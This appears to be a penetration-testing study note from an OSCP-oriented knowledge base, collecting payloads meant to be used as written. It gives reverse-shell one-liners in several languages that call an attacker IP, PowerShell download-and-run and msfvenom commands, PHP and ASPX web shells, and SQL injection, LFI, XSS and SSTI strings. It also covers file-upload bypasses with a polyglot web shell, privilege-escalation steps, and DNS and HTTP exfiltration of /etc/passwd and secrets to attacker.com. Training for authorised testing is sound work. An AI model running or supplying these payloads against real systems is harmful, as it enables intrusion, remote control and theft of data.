---
title: Payloads & Pre-built Shells
description: Ready-to-use reverse shells, web payloads, and exploit code
tags: [payloads, shells, oscp]
---

#  Payloads & Pre-built Shells

> Ready-to-use payloads for common scenarios. Always customize with your attacker IP/port before use.

---

##  Reverse Shell One-Liners

### Linux / Bash

```bash
# bash
bash -i >& /dev/tcp/10.10.14.XXX/4444 0>&1

# sh (more portable)
sh -i >& /dev/tcp/10.10.14.XXX/4444 0>&1

# with exec
exec bash -i >& /dev/tcp/10.10.14.XXX/4444 0>&1
```

### Python

```python
# Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.XXX",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.XXX",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
```

### PHP

```php
<?php system($_GET['cmd']); ?>

<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.XXX/4444 0>&1'"); ?>

<?php $sock=fsockopen("10.10.14.XXX",4444);exec("/bin/bash -i <&3 >&3 2>&3"); ?>
```

### NC (Netcat)

```bash
# Listener on attacker
nc -lnvp 4444

# Reverse shell on target (if nc available)
nc 10.10.14.XXX 4444 -e /bin/bash
nc -e /bin/bash 10.10.14.XXX 4444
```

### Perl

```perl
perl -e 'use Socket;$i="10.10.14.XXX";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

---

##  Windows Payloads

### PowerShell Reverse Shell

```powershell
# One-liner reverse shell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.14.XXX",4444);$stream = $client.GetStream();[byte[]]$buffer = 0..65535|%{0};while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# Shorter version (stageless)
powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.XXX:8000/shell.ps1')
```

### CMD Reverse Shell

```cmd
:: Simple reverse shell (requires netcat on target)
nc.exe 10.10.14.XXX 4444 -e cmd.exe
```

### Metasploit msfvenom Payloads

```bash
# Windows staged reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.XXX LPORT=4444 -f exe > payload.exe

# Windows stageless reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.XXX LPORT=4444 -f exe > payload.exe

# PowerShell oneliner
msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.14.XXX LPORT=8443 -f psh -o payload.ps1
```

### ASP/ASPX Web Shell

```aspx
<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start("cmd.exe","/c whoami > C:\\output.txt"); %>
```

---

##  Web Application Payloads

### SQL Injection Payloads

```sql
-- Authentication bypass
admin' or '1'='1
' or 1=1 -- 
' or 'a'='a

-- Union-based enumeration
' UNION SELECT database(), user(), @@version-- 
' UNION SELECT table_name, column_name, null FROM information_schema.columns WHERE table_schema=database()-- 
```

### LFI / Path Traversal

```
../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
....//....//....//etc/passwd
..\\..\\..\\windows\\win.ini
```

### PHP Filter RCE

```
/index.php?page=php://filter/convert.base64-encode/resource=index.php

/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
```

### XSS Payloads

```html
<script>alert('XSS')</script>

<img src=x onerror="alert('XSS')">

<svg/onload="alert('XSS')">

<iframe src="javascript:alert('XSS')">
```

### SSTI Payloads

```
{{ 7 * 7 }}     <!-- If returns 49, template injection -->

{{ ''.__class__.__mro__[1].__subclasses__() }}

${7*7}

<%= 7 * 7 %>
```

---

##  File Upload Bypass Payloads

### Double Extension

```
shell.php.jpg
shell.php.png
shell.jpg.php
```

### Null Byte (PHP < 5.3)

```
shell.php%00.jpg
shell.php\x00.jpg
```

### Alternative Extensions

```
.php3  .php4  .php5  .phtml  .phar
.asp   .aspx  .cer   .asa
.jsp   .jspx  .jsw   .jsv
```

### Magic Bytes (Polyglot File)

```bash
# JPEG that executes as PHP
echo -n "<?php system($_GET['cmd']); ?>" > shell.jpg
# Then prepend JPEG header
printf '\xFF\xD8\xFF\xE0' | cat - shell.jpg > shell_final.jpg
```

---

##  Privilege Escalation Payloads

### Linux SUID Exploitation

```bash
# Compile SUID binary that spawns bash
int main() {
    setuid(0);
    system("/bin/bash");
    return 0;
}

gcc -o suid_shell suid.c
chmod u+s suid_shell
./suid_shell
```

### Windows UAC Bypass (Token Impersonation)

```powershell
# PrintSpoofer (built-in SYSTEM abuse)
.\PrintSpoofer.exe -i -c powershell.exe

# GodPotato
.\GodPotato-NET4.exe -cmd "whoami"
```

---

##  Exfiltration Payloads

### DNS Exfiltration

```bash
# Base64 encode and send via DNS
cat /etc/passwd | base64 | while IFS= read -r line; do
  nslookup "$line.attacker.com"
done
```

### HTTP Exfiltration

```bash
# Upload files to attacker server
curl -F "file=@/etc/passwd" http://attacker.com:8000/upload

# Base64 via HTTP header
curl -H "X-Data: $(cat secret.txt | base64)" http://attacker.com/log
```

---

##  Generator Tools

### MSFVenom (Metasploit Payload Generator)

```bash
# List available payloads
msfvenom -l payloads

# Windows x64 Meterpreter reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.XXX LPORT=4444 -f exe > payload.exe

# Linux ELF Meterpreter
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.XXX LPORT=4444 -f elf > payload

# Android
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.10.14.XXX LPORT=4444 -o payload.apk
```

### PHP Filter Chain Generator

```bash
# Generate PHP filter RCE chain
python3 php_filter_chain_generator.py --chain '<?= system($_GET["cmd"]); ?>'
```

---

##  Quick Reference

| Scenario | Best Payload |
|----------|--------------|
| Low-priv Linux shell | bash -i >& /dev/tcp |
| Low-priv Windows shell | cmd.exe reverse shell (Metasploit) |
| Web app RCE | PHP file upload or LFI |
| Blind RCE (no output) | Reverse shell or out-of-band (DNS/HTTP) |
| Persistence | cron + script or Windows scheduled task |
| Lateral movement | SSH key or WinRM (creds required) |

---

##  OSCP Notes

- **Always test** payloads on a lab machine first
- **Customize IPs/ports** before using ( Don't hardcode)
- **Document payload** used in your writeup
- **Keep evidence** of exploitation (screenshots)
- **Understand what you're running** — no copy-paste without verification

---

##  Related

- [[../Tools-Reference/00-Tools-Index|Tools Reference]]
- [[../Exploitation/00-Exploitation-Index|Exploitation Techniques]]
- [[../Writeup-Templates/Writeup-Template|Writeup Template]]

---

**Status**: Common payloads collected | **Last Updated**: 2026-10-07
